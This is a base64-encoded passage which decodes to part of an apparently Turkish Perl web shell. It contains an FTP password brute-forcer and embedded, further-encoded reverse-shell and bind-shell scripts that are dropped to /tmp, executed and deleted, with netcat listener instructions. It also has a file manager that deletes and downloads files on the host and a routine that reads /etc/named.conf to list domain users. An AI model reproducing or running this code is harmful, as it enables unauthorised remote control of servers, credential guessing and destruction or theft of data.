VyDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQnJ1dGVGb3JjZXINCnsNCglteSAkcmVzdWx0PSIiOw0KCSRTZXJ2ZXI9JEVOVnsnU0VSVkVSX0FERFInfTsNCglpZigkaW57J3VzZXInfSBlcSAiIikNCgl7DQoJCSRyZXN1bHQgLj0gJkJydXRlRm9yY2VyRm9ybTsNCgl9ZWxzZQ0KCXsNCgkJdXNlIE5ldDo6RlRQOyANCgkJQHVzZXI9IHNwbGl0KC9cbi8sICRpbnsndXNlcid9KTsNCgkJQHBhc3M9IHNwbGl0KC9cbi8sICRpbnsncGFzcyd9KTsNCgkJY2hvbXAoQHVzZXIpOw0KCQljaG9tcChAcGFzcyk7DQoJCSRyZXN1bHQgLj0gIjxicj48YnI+WytdIFRyeWluZyBicnV0ZSAkU2VydmVyTmFtZTxicj49PT09PT09PT09PT09PT09PT09PT4+Pj4+Pj4+Pj4+Pjw8PDw8PDw8PDw9PT09PT09PT09PT09PT09PT09PTxicj48YnI+XG4iOw0KCQlmb3JlYWNoICR1c2VybmFtZSAoQHVzZXIpDQoJCXsNCgkJCWlmKCR1c2VybmFtZSBuZSAiIikNCgkJCXsNCgkJCQlmb3JlYWNoICRwYXNzd29yZCAoQHBhc3MpDQoJCQkJew0KCQkJCQkkZnRwID0gTmV0OjpGVFAtPm5ldygkU2VydmVyKSBvciBkaWUgIkJhZ2xhbmlsYW1hZGk6ICRTZXJ2ZXJOYW1lXG4iOyANCgkJCQkJaWYoJGZ0cC0+bG9naW4oIiR1c2VybmFtZSIsIiRwYXNzd29yZCIpKQ0KCQkJCQl7DQoJCQkJCQkkcmVzdWx0IC49ICI8YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0nZnRwOi8vJHVzZXJuYW1lOiRwYXNzd29yZFxAJFNlcnZlcic+WytdIGZ0cDovLyR1c2VybmFtZTokcGFzc3dvcmRcQCRTZXJ2ZXI8L2E+PGJyPlxuIjsNCgkJCQkJCSRmdHAtPnF1aXQoKTsNCgkJCQkJCWJyZWFrOw0KCQkJCQl9DQoJCQkJCWlmKCRpbnsnc2xlZXAnfSBuZSAiMCIpDQoJCQkJCXsNCgkJCQkJCXNsZWVwKGludCgkaW57J3NsZWVwJ30pICogMTAwMCk7DQoJCQkJCX0NCgkJCQkJJGZ0cC0+cXVpdCgpOw0KCQkJCX0NCgkJCX0NCgkJfQ0KCQkkcmVzdWx0IC49ICJcbjxicj49PT09PT09PT09Pj4+Pj4+Pj4+PiBCaXR0aSA8PDw8PDw8PDw8PT09PT09PT09PTxicj5cbiI7DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBCYWNrY29ubmVjdCBGb3JtDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQmFja0JpbmRGb3JtDQp7DQoJcmV0dXJuIDw8RU5EOw0KCTxicj48YnI+DQoNCgk8dGFibGU+DQoJPHRyPg0KCTxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KCTx0ZD5CYWNrQ29ubmVjdDogPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImJhY2tiaW5kIj48L3RkPg0KCTx0ZD4gSG9zdDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjIwIiBuYW1lPSJjbGllbnRhZGRyIiB2YWx1ZT0iJEVOVnsnUkVNT1RFX0FERFInfSI+DQoJIFBvcnQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSI2IiBuYW1lPSJjbGllbnRwb3J0IiB2YWx1ZT0iODAiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiYScpLmlubmVySFRNTD10aGlzLnZhbHVlOyI+PC90ZD4NCg0KCTx0ZD48aW5wdXQgbmFtZT0icyIgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJCYWdsYW4gUGFucGEiPjwvdGQ+DQoJPC9mb3JtPg0KCTwvdHI+DQoJPHRyPg0KCTx0ZCBjb2xzcGFuPTM+PGZvbnQgY29sb3I9I0ZGRkZGRj5bK10gQmFja0Nvbm5lY3QgT2xtYWsgSWNpbiBQb3J0IERpbmxlbWV5aSBVbnV0bWF5aW4hDQoJPGJyPlsrXSBQb3J0IERpbmxlbWVrIEljaW46IDxydW4+bmMgLXZ2IC1sIC1wIDxzcGFuIGlkPSJiYSI+ODA8L3NwYW4+PC9ydW4+PC9mb250PjwvdGQ+DQoNCgk8L3RyPg0KCTwvdGFibGU+DQoNCgk8YnI+PGJyPg0KCTx0YWJsZT4NCgk8dHI+DQoJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQoJPHRkPkJpbmQgUG9ydDogPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImJhY2tiaW5kIj48L3RkPg0KDQoJPHRkPiBQb3J0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMTUiIG5hbWU9ImNsaWVudHBvcnQiIHZhbHVlPSIxNDEyIiBvbmtleXVwPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYmknKS5pbm5lckhUTUw9dGhpcy52YWx1ZTsiPg0KDQoJIFBhc3N3b3JkOiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMTIiIG5hbWU9ImJpbmRwYXNzIiB2YWx1ZT0idmluYWtpZCI+PC90ZD4NCgk8dGQ+PGlucHV0IG5hbWU9InMiIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0iQmFzIHBhbnBhIj48L3RkPg0KCTwvZm9ybT4NCgk8L3RyPg0KCTx0cj4NCgk8dGQgY29sc3Bhbj0zPjxmb250IGNvbG9yPSNGRkZGRkY+WytdIFRlc3QgRWRpbGl5b3IgLi4uLg0KCTxicj5bK10gS29tdXQgRGVuZW5peW9yOiA8cnVuPm5jICRFTlZ7J1NFUlZFUl9BRERSJ30gPHNwYW4gaWQ9ImJpIj4xNDEyPC9zcGFuPjwvcnVuPjwvZm9udD48L3RkPg0KDQoJPC90cj4NCgk8L3RhYmxlPjxicj4NCkVORA0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBCYWNrY29ubmVjdCB1c2UgcGVybA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEJhY2tCaW5kDQp7DQoJdXNlIFNvY2tldDsJDQoJJGJhY2twZXJsPSJJeUV2ZFhOeUwySnBiaTl3WlhKc0RRcDFjMlVnU1U4Nk9sTnZZMnRsZERzTkNpUlRhR1ZzYkFrOUlDSXZZbWx1TDJKaGMyZ2lPdzBLSkVGU1IwTTlRRUZTUjFZN0RRcDFjMlVnVTI5amEyVjBPdzBLZFhObElFWnBiR1ZJWVc1a2JHVTdEUXB6YjJOclpYUW9VMDlEUzBWVUxDQlFSbDlKVGtWVUxDQlRUME5MWDFOVVVrVkJUU3dnWjJWMGNISnZkRzlpZVc1aGJXVW9JblJqY0NJcEtTQnZjaUJrYVdVZ2NISnBiblFnSWxzdFhTQlZibUZpYkdVZ2RHOGdVbVZ6YjJ4MlpTQkliM04wWEc0aU93MEtZMjl1Ym1WamRDaFRUME5MUlZRc0lITnZZMnRoWkdSeVgybHVLQ1JCVWtkV1d6RmRMQ0JwYm1WMFgyRjBiMjRvSkVGU1IxWmJNRjBwS1NrZ2IzSWdaR2xsSUhCeWFXNTBJQ0piTFYwZ1ZXNWhZbXhsSUhSdklFTnZibTVsWTNRZ1NHOXpkRnh1SWpzTkNuQnlhVzUwSUNKRGIyNXVaV04wWldRaElqc05DbE5QUTB0RlZDMCtZWFYwYjJac2RYTm9LQ2s3RFFwdmNHVnVLRk5VUkVsT0xDQWlQaVpUVDBOTFJWUWlLVHNOQ205d1pXNG9VMVJFVDFWVUxDSStKbE5QUTB0RlZDSXBPdzBLYjNCbGJpaFRWRVJGVWxJc0lqNG1VMDlEUzBWVUlpazdEUXB3Y21sdWRDQWlMUzA5UFNCRGIyNXVaV04wWldRZ1FtRmphMlJ2YjNJZ1BUMHRMU0FnWEc1Y2JpSTdEUXB6ZVhOMFpXMG9JblZ1YzJWMElFaEpVMVJHU1V4Rk95QjFibk5sZENCVFFWWkZTRWxUVkNBN1pXTm9ieUFuV3l0ZElGTjVjM1JsYldsdVptODZJQ2M3SUhWdVlXMWxJQzFoTzJWamFHODdaV05vYnlBbld5dGRJRlZ6WlhKcGJtWnZPaUFuT3lCcFpEdGxZMmh2TzJWamFHOGdKMXNyWFNCRWFYSmxZM1J2Y25rNklDYzdJSEIzWkR0bFkyaHZPeUJsWTJodklDZGJLMTBnVTJobGJHdzZJQ2M3SkZOb1pXeHNJaWs3RFFwamJHOXpaU0JUVDBOTFJWUTciOw0KCSRiaW5kcGVybD0iSXlFdmRYTnlMMkpwYmk5d1pYSnNEUXAxYzJVZ1UyOWphMlYwT3cwS0pFRlNSME05UUVGU1IxWTdEUW9rY0c5eWRBazlJQ1JCVWtkV1d6QmRPdzBLSkhCeWIzUnZDVDBnWjJWMGNISnZkRzlpZVc1aGJXVW9KM1JqY0NjcE93MEtKRk5vWld4c0NUMGdJaTlpYVc0dlltRnphQ0k3RFFwemIyTnJaWFFvVTBWU1ZrVlNMQ0JRUmw5SlRrVlVMQ0JUVDBOTFgxTlVVa1ZCVFN3Z0pIQnliM1J2S1c5eUlHUnBaU0FpYzI5amEyVjBPaVFoSWpzTkNuTmxkSE52WTJ0dmNIUW9VMFZTVmtWU0xDQlRUMHhmVTA5RFMwVlVMQ0JUVDE5U1JWVlRSVUZFUkZJc0lIQmhZMnNvSW13aUxDQXhLU2x2Y2lCa2FXVWdJbk5sZEhOdlkydHZjSFE2SUNRaElqc05DbUpwYm1Rb1UwVlNWa1ZTTENCemIyTnJZV1JrY2w5cGJpZ2tjRzl5ZEN3Z1NVNUJSRVJTWDBGT1dTa3BiM0lnWkdsbElDSmlhVzVrT2lBa0lTSTdEUXBzYVhOMFpXNG9VMFZTVmtWU0xDQlRUMDFCV0VOUFRrNHBDUWx2Y2lCa2FXVWdJbXhwYzNSbGJqb2dKQ0VpT3cwS1ptOXlLRHNnSkhCaFpHUnlJRDBnWVdOalpYQjBLRU5NU1VWT1ZDd2dVMFZTVmtWU0tUc2dZMnh2YzJVZ1EweEpSVTVVS1EwS2V3MEtDVzl3Wlc0b1UxUkVTVTRzSUNJK0prTk1TVVZPVkNJcE93MEtDVzl3Wlc0b1UxUkVUMVZVTENBaVBpWkRURWxGVGxRaUtUc05DZ2x2Y0dWdUtGTlVSRVZTVWl3Z0lqNG1RMHhKUlU1VUlpazdEUW9KYzNsemRHVnRLQ0oxYm5ObGRDQklTVk5VUmtsTVJUc2dkVzV6WlhRZ1UwRldSVWhKVTFRZ08yVmphRzhnSjFzclhTQlRlWE4wWlcxcGJtWnZPaUFuT3lCMWJtRnRaU0F0WVR0bFkyaHZPMlZqYUc4Z0oxc3JYU0JWYzJWeWFXNW1iem9nSnpzZ2FXUTdaV05vYnp0bFkyaHZJQ2RiSzEwZ1JHbHlaV04wYjNKNU9pQW5PeUJ3ZDJRN1pXTm9ienNnWldOb2J5QW5XeXRkSUZOb1pXeHNPaUFuT3lSVGFHVnNiQ0lwT3cwS0NXTnNiM05sS0ZOVVJFbE9LVHNOQ2dsamJHOXpaU2hUVkVSUFZWUXBPdzBLQ1dOc2IzTmxLRk5VUkVWU1VpazdEUXA5RFFvPSI7DQoNCgkkQ2xpZW50QWRkciA9ICRpbnsnY2xpZW50YWRkcid9Ow0KCSRDbGllbnRQb3J0ID0gaW50KCRpbnsnY2xpZW50cG9ydCd9KTsNCglpZigkQ2xpZW50UG9ydCBlcSAwKQ0KCXsNCgkJcmV0dXJuICZCYWNrQmluZEZvcm07DQoJfWVsc2lmKCEkQ2xpZW50QWRkciBlcSAiIikNCgl7DQoJCSREYXRhPWRlY29kZV9iYXNlNjQoJGJhY2twZXJsKTsNCgkJaWYoLXcgIi90bXAvIikNCgkJew0KCQkJJEZpbGU9Ii90bXAvYmFja2Nvbm5lY3QucGwiOwkNCgkJfWVsc2UNCgkJew0KCQkJJEZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuImJhY2tjb25uZWN0LnBsIjsNCgkJfQ0KCQlvcGVuKEZJTEUsICI+JEZpbGUiKTsNCgkJcHJpbnQgRklMRSAkRGF0YTsNCgkJY2xvc2UgRklMRTsNCgkJc3lzdGVtKCJwZXJsICRGaWxlICRDbGllbnRBZGRyICRDbGllbnRQb3J0Iik7DQoJCXVubGluaygkRmlsZSk7DQoJCWV4aXQgMDsNCgl9ZWxzZQ0KCXsNCgkJJERhdGE9ZGVjb2RlX2Jhc2U2NCgkYmluZHBlcmwpOw0KCQlpZigtdyAiL3RtcCIpDQoJCXsNCgkJCSRGaWxlPSIvdG1wL2JpbmRwb3J0LnBsIjsJDQoJCX1lbHNlDQoJCXsNCgkJCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiJiaW5kcG9ydC5wbCI7DQoJCX0NCgkJb3BlbihGSUxFLCAiPiRGaWxlIik7DQoJCXByaW50IEZJTEUgJERhdGE7DQoJCWNsb3NlIEZJTEU7DQoJCXN5c3RlbSgicGVybCAkRmlsZSAkQ2xpZW50UG9ydCIpOw0KCQl1bmxpbmsoJEZpbGUpOw0KCQlleGl0IDA7DQoJfQ0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyAgQXJyYXkgTGlzdCBEaXJlY3RvcnkNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBSbURpcigkKSANCnsNCglteSAkZGlyID0gc2hpZnQ7DQoJaWYob3BlbmRpcihESVIsJGRpcikpDQoJew0KCQl3aGlsZSgkZmlsZSA9IHJlYWRkaXIoRElSKSkNCgkJew0KCQkJaWYoKCRmaWxlIG5lICIuIikgJiYgKCRmaWxlIG5lICIuLiIpKQ0KCQkJew0KCQkJCSRmaWxlPSAkZGlyLiRQYXRoU2VwLiRmaWxlOw0KCQkJCWlmKC1kICRmaWxlKQ0KCQkJCXsNCgkJCQkJJlJtRGlyKCRmaWxlKTsNCgkJCQl9DQoJCQkJZWxzZQ0KCQkJCXsNCgkJCQkJdW5saW5rKCRmaWxlKTsNCgkJCQl9DQoJCQl9DQoJCX0NCgkJY2xvc2VkaXIoRElSKTsNCgl9DQp9DQpzdWIgRmlsZU93bmVyKCQpDQp7DQoJbXkgJGZpbGUgPSBzaGlmdDsNCglpZigtZSAkZmlsZSkNCgl7DQoJCSgkdWlkLCRnaWQpID0gKHN0YXQoJGZpbGUpKVs0LDVdOw0KCQlpZigkV2luTlQpDQoJCXsNCgkJCXJldHVybiAiPz8/IjsNCgkJfQ0KCQllbHNlDQoJCXsNCgkJCSRuYW1lPWdldHB3dWlkKCR1aWQpOw0KCQkJJGdyb3VwPWdldGdyZ2lkKCRnaWQpOw0KCQkJcmV0dXJuICRuYW1lLiIvIi4kZ3JvdXA7DQoJCX0NCgl9DQoJcmV0dXJuICI/Pz8iOw0KfQ0Kc3ViIFBhcmVudEZvbGRlcigkKQ0Kew0KCW15ICRwYXRoID0gc2hpZnQ7DQoJbXkgJENvbW0gPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAuLiIuJENtZFNlcC4kQ21kUHdkOw0KCWNob3AoJHBhdGggPSBgJENvbW1gKTsNCglyZXR1cm4gJHBhdGg7DQp9DQpzdWIgRmlsZVBlcm1zKCQpDQp7DQoJbXkgJGZpbGUgPSBzaGlmdDsNCglteSAkdXIgPSAiLSI7DQoJbXkgJHV3ID0gIi0iOw0KCWlmKC1lICRmaWxlKQ0KCXsNCgkJaWYoJFdpbk5UKQ0KCQl7DQoJCQlpZigtciAkZmlsZSl7ICR1ciA9ICJyIjsgfQ0KCQkJaWYoLXcgJGZpbGUpeyAkdXcgPSAidyI7IH0NCgkJCXJldHVybiAkdXIgLiAiIC8gIiAuICR1dzsNCgkJfWVsc2UNCgkJew0KCQkJJG1vZGU9KHN0YXQoJGZpbGUpKVsyXTsNCgkJCSRyZXN1bHQgPSBzcHJpbnRmKCIlMDRvIiwgJG1vZGUgJiAwNzc3Nyk7DQoJCQlyZXR1cm4gJHJlc3VsdDsNCgkJfQ0KCX0NCglyZXR1cm4gIjAwMDAiOw0KfQ0Kc3ViIEZpbGVMYXN0TW9kaWZpZWQoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCWlmKC1lICRmaWxlKQ0KCXsNCgkJKCRsYSkgPSAoc3RhdCgkZmlsZSkpWzldOw0KCQkoJGQsJG0sJHksJGgsJGkpID0gKGxvY2FsdGltZSgkbGEpKVszLDQsNSwyLDFdOw0KCQkkeSA9ICR5ICsgMTkwMDsNCgkJQG1vbnRoID0gcXcvMSAyIDMgNCA1IDYgNyA4IDkgMTAgMTEgMTIvOw0KCQkkbG10aW1lID0gc3ByaW50ZigiJTAyZC8lcy8lNGQgJTAyZDolMDJkIiwkZCwkbW9udGhbJG1dLCR5LCRoLCRpKTsNCgkJcmV0dXJuICRsbXRpbWU7DQoJfQ0KCXJldHVybiAiPz8/IjsNCn0NCnN1YiBGaWxlU2l6ZSgkKQ0Kew0KCW15ICRmaWxlID0gc2hpZnQ7DQoJaWYoLWYgJGZpbGUpDQoJew0KCQlyZXR1cm4gLXMgIiRmaWxlIjsNCgl9DQoJcmV0dXJuICIwIjsNCn0NCnN1YiBQYXJzZUZpbGVTaXplKCQpDQp7DQoJbXkgJHNpemUgPSBzaGlmdDsNCglpZigkc2l6ZSA8PSAxMDI0KQ0KCXsNCgkJcmV0dXJuICRzaXplLiAiIEIiOw0KCX0NCgllbHNlDQoJew0KCQlpZigkc2l6ZSA8PSAxMDI0KjEwMjQpIA0KCQl7DQoJCQkkc2l6ZSA9IHNwcmludGYoIiUuMDJmIiwkc2l6ZSAvIDEwMjQpOw0KCQkJcmV0dXJuICRzaXplLiIgS0IiOw0KCQl9DQoJCWVsc2UgDQoJCXsNCgkJCSRzaXplID0gc3ByaW50ZigiJS4yZiIsJHNpemUgLyAxMDI0IC8gMTAyNCk7DQoJCQlyZXR1cm4gJHNpemUuIiBNQiI7DQoJCX0NCgl9DQp9DQpzdWIgdHJpbSgkKQ0Kew0KCW15ICRzdHJpbmcgPSBzaGlmdDsNCgkkc3RyaW5nID1+IHMvXlxzKy8vOw0KCSRzdHJpbmcgPX4gcy9ccyskLy87DQoJcmV0dXJuICRzdHJpbmc7DQp9DQpzdWIgQWRkU2xhc2hlcygkKQ0Kew0KCW15ICRzdHJpbmcgPSBzaGlmdDsNCgkkc3RyaW5nPX4gcy9cXC9cXFxcL2c7DQoJcmV0dXJuICRzdHJpbmc7DQp9DQpzdWIgVHJpbVNsYXNoZXMoJCkNCnsNCglteSAkc3RyaW5nID0gc2hpZnQ7DQoJJHN0cmluZz1+IHMvXC9cLy9cLy9nOw0KCSRzdHJpbmc9fiBzL1xcXFwvXFwvZzsNCglyZXR1cm4gJHN0cmluZzsNCn0NCnN1YiBMaXN0RGlyDQp7DQoJbXkgJHBhdGggPSAmVHJpbVNsYXNoZXMoJEN1cnJlbnREaXIuJFBhdGhTZXApOw0KCW15ICRyZXN1bHQgPSAiPGZvcm0gbmFtZT0nZicgb25TdWJtaXQ9XCJFbmNvZGVyKCdkJylcIiBhY3Rpb249JyRTY3JpcHRMb2NhdGlvbic+PHNwYW4gc3R5bGU9J2ZvbnQ6IDExcHQgVmVyZGFuYTsgZm9udC13ZWlnaHQ6IGJvbGQ7Jz5QYXRoOiBbICIuJkFkZExpbmtEaXIoImd1aSIpLiIgXSA8L3NwYW4+PGlucHV0IHR5cGU9J3RleHQnIGlkPSdkJyBuYW1lPSdkJyBzaXplPSc0MCcgdmFsdWU9JyRDdXJyZW50RGlyJyAvPjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2EnIHZhbHVlPSdndWknPjxpbnB1dCBjbGFzcz0nc3VibWl0JyB0eXBlPSdzdWJtaXQnIHZhbHVlPSdEZWdpc3Rpcic+PC9mb3JtPiI7DQoJaWYoLWQgJHBhdGgpDQoJew0KCQlteSBAZm5hbWUgPSAoKTsNCgkJbXkgQGRuYW1lID0gKCk7DQoJCWlmKG9wZW5kaXIoRElSLCRwYXRoKSkNCgkJew0KCQkJd2hpbGUoJGZpbGUgPSByZWFkZGlyKERJUikpDQoJCQl7DQoJCQkJJGY9JHBhdGguJGZpbGU7DQoJCQkJaWYoLWQgJGYpDQoJCQkJew0KCQkJCQlwdXNoKEBkbmFtZSwkZmlsZSk7DQoJCQkJfQ0KCQkJCWVsc2UNCgkJCQl7DQoJCQkJCXB1c2goQGZuYW1lLCRmaWxlKTsNCgkJCQl9DQoJCQl9DQoJCQljbG9zZWRpcihESVIpOw0KCQl9DQoJCUBmbmFtZSA9IHNvcnQgeyBsYygkYSkgY21wIGxjKCRiKSB9IEBmbmFtZTsNCgkJQGRuYW1lID0gc29ydCB7IGxjKCRhKSBjbXAgbGMoJGIpIH0gQGRuYW1lOw0KCQkkcmVzdWx0IC49ICI8ZGl2Pjx0YWJsZSB3aWR0aD0nOTAlJyBjbGFzcz0nbGlzdGRpcic+DQoJCTx0ciBzdHlsZT0nYmFja2dyb3VuZC1jb2xvcjogIzNlM2UzZSc+PHRoPkRvc3lhIElzbWk8L3RoPg0KCQk8dGggd2lkdGg9JzEwMCc+RmlsZSBTaXplPC90aD4NCgkJPHRoIHdpZHRoPScxNTAnPk93bmVyPC90aD4NCgkJPHRoIHdpZHRoPScxMDAnPlBlcm1pc3Npb248L3RoPg0KCQk8dGggd2lkdGg9JzE1MCc+TGFzdCBNb2RpZmllZDwvdGg+DQoJCTx0aCB3aWR0aD0nMjMwJz5BY3Rpb248L3RoPjwvdHI+IjsNCgkJbXkgJHN0eWxlPSJub3RsaW5lIjsNCgkJbXkgJGk9MDsNCgkJZm9yZWFjaCBteSAkZCAoQGRuYW1lKQ0KCQl7DQoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOw0KCQkJJGQgPSAmdHJpbSgkZCk7DQoJCQkkZGlybmFtZT0kZDsNCgkJCWlmKCRkIGVxICIuLiIpIA0KCQkJew0KCQkJCSRkID0gJlBhcmVudEZvbGRlcigkcGF0aCk7DQoJCQl9DQoJCQllbHNpZigkZCBlcSAiLiIpIA0KCQkJew0KCQkJCW5leHQ7DQoJCQl9DQoJCQllbHNlIA0KCQkJew0KCQkJCSRkID0gJHBhdGguJGQ7DQoJCQl9DQoJCQkkcmVzdWx0IC49ICI8dHIgY2xhc3M9JyRzdHlsZSc+PHRkIGlkPSdGaWxlXyRpJyBjbGFzcz0nZGlyJz48YSAgaHJlZj0nP2E9Z3VpJmQ9Ii4mRW5jb2RlRGlyKCRkKS4iJz5bICIuJGRpcm5hbWUuIiBdPC9hPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZD5ESVI8L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQ+Ii4mRmlsZU93bmVyKCRkKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIGlkPSdGaWxlUGVybXNfJGknIG9uZGJsY2xpY2s9XCJybV9jaG1vZF9mb3JtKHRoaXMsIi4kaS4iLCciLiZGaWxlUGVybXMoJGQpLiInLCciLiRkaXJuYW1lLiInKVwiID48c3BhbiBvbmNsaWNrPVwiY2htb2RfZm9ybSgiLiRpLiIsJyIuJGRpcm5hbWUuIicpXCIgPiIuJkZpbGVQZXJtcygkZCkuIjwvc3Bhbj48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQ+Ii4mRmlsZUxhc3RNb2RpZmllZCgkZCkuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZD48YSBvbmNsaWNrPVwicmVuYW1lX2Zvcm0oJGksJyRkaXJuYW1lJywnIi4mQWRkU2xhc2hlcygmQWRkU2xhc2hlcygkZCkpLiInKTsgcmV0dXJuIGZhbHNlOyBcIj5Jc2ltIERlZ2lzdGlyPC9hPiAgfCA8YSBvbmNsaWNrPVwiaWYoIWNvbmZpcm0oJ1NpbDogJGRpcm5hbWUgPycpKSB7IHJldHVybiBmYWxzZTt9XCIgaHJlZj0nP2E9Z3VpJmQ9Ii4mRW5jb2RlRGlyKCRwYXRoKS4iJnJlbW92ZT0kZGlybmFtZSc+U2lsPC9hPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjwvdHI+IjsNCgkJCSRpKys7DQoJCX0NCgkJZm9yZWFjaCBteSAkZiAoQGZuYW1lKQ0KCQl7DQoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOw0KCQkJJGZpbGU9JGY7DQoJCQkkZiA9ICRwYXRoLiRmOw0KCQkJbXkgJGFjdGlvbiA9IGVuY29kZV9iYXNlNjQoImVkaXQgIi4kZmlsZSk7DQoJCQkkdmlldyA9ICI/ZGlyPSIuJHBhdGguIiZ2aWV3PSIuJGY7DQoJCQkkcmVzdWx0IC49ICI8dHIgY2xhc3M9JyRzdHlsZSc+PHRkIGlkPSdGaWxlXyRpJyBjbGFzcz0nZmlsZSc+PGEgaHJlZj0nP2E9Y29tbWFuZCZkPSIuJkVuY29kZURpcigkcGF0aCkuIiZjPSIuJGFjdGlvbi4iJz4iLiRmaWxlLiI8L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPiIuJlBhcnNlRmlsZVNpemUoJkZpbGVTaXplKCRmKSkuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZD4iLiZGaWxlT3duZXIoJGYpLiI8L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgaWQ9J0ZpbGVQZXJtc18kaScgb25kYmxjbGljaz1cInJtX2NobW9kX2Zvcm0odGhpcywiLiRpLiIsJyIuJkZpbGVQZXJtcygkZikuIicsJyIuJGZpbGUuIicpXCIgPjxzcGFuIG9uY2xpY2s9XCJjaG1vZF9mb3JtKCRpLCckZmlsZScpXCIgPiIuJkZpbGVQZXJtcygkZikuIjwvc3Bhbj48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQ+Ii4mRmlsZUxhc3RNb2RpZmllZCgkZikuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZD48YSBvbmNsaWNrPVwicmVuYW1lX2Zvcm0oJGksJyRmaWxlJywnZicpOyByZXR1cm4gZmFsc2U7XCI+SXNpbSBEZWdpc3RpcjwvYT4gfCA8YSBocmVmPSc/YT1kb3dubG9hZCZvPWdvJmY9Ii4kZi4iJz5JbmRpcjwvYT4gfCA8YSBvbmNsaWNrPVwiaWYoIWNvbmZpcm0oJ1NpbDogJGZpbGUgPycpKSB7IHJldHVybiBmYWxzZTt9XCIgaHJlZj0nP2E9Z3VpJmQ9Ii4mRW5jb2RlRGlyKCRwYXRoKS4iJnJlbW92ZT0kZmlsZSc+U2lsPC9hPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjwvdHI+IjsNCgkJCSRpKys7DQoJCX0NCgkJJHJlc3VsdCAuPSAiPC90YWJsZT48L2Rpdj4iOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVHJ5IHRvIFZpZXcgTGlzdCBVc2VyDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVmlld0RvbWFpblVzZXINCnsNCglvcGVuIChkMG1haW5zLCAnL2V0Yy9uYW1lZC5jb25mJykgb3IgJGVycj0xOw0KCW15IEBjbnpzID0gPGQwbWFpbnM+Ow0KCWNsb3NlIGQwbWFpbnM7DQoJbXkgJHN0eWxlPSJsaW5lIjsNCglteSAkcmVzdWx0PSI8aDM+PGZvbnQgc3R5bGU9J2ZvbnQ6IDE1cHQgVmVyZGFuYTtjb2xvcjogI2ZmOTkwMDsnPkRvbWFpbiBbK10gS3VsbGFuaWNpPC9mb250PjwvaDM+IjsNCglpZiAoJGVycikNCg